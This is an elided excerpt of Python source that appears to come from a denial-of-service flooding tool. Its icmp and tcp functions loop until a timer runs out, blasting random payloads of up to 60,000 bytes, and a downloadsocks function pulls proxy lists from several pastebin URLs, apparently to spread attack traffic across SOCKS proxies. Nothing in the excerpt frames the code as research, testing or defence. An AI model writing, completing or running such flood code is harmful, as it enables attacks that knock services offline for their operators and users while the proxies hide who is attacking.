...
def icmp(event, timer):
    ...
    while time.time() < timer:
        try:
            for _ in range(multiple):
                packet = random._urandom(int(Intn(4096, 60000)))
...
def tcp(event, timer):
    ...
    while time.time() < timer:
        try:
            data = random._urandom(int(Intn(4096, 60000)))
...
def downloadsocks(choice):
    ...
    if choice == "4":
        ...
        try:
            ...
            req = requests.get("https://pastebin.com/raw/E1QD0usZ/", timeout=10, headers={"User-Agent", UserAgent}).text
            part = str(req)
    ...
    if choice == "5":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://pastebin.com/raw/H8Fx1mGz",
                             timeout=10)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://pastebin.com/raw/gYSPDnkF", timeout=10)
            f.write(r.content)
            f.close()
        except:
            pass
        try:
            r = requests.get("https://pastebin.com/raw/Y3yVSEn3", timeout=10)
            f.write(r.content)
            f.close()
        except:
            pass
        try:
            r = requests.get("https://pastebin.com/raw/F0gnpPdq", timeout=10)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get(
                "https://pastebin.com/raw/9E1cDA0j",
                timeout=5)
            f.write(r.content)
            f.close()
        except:
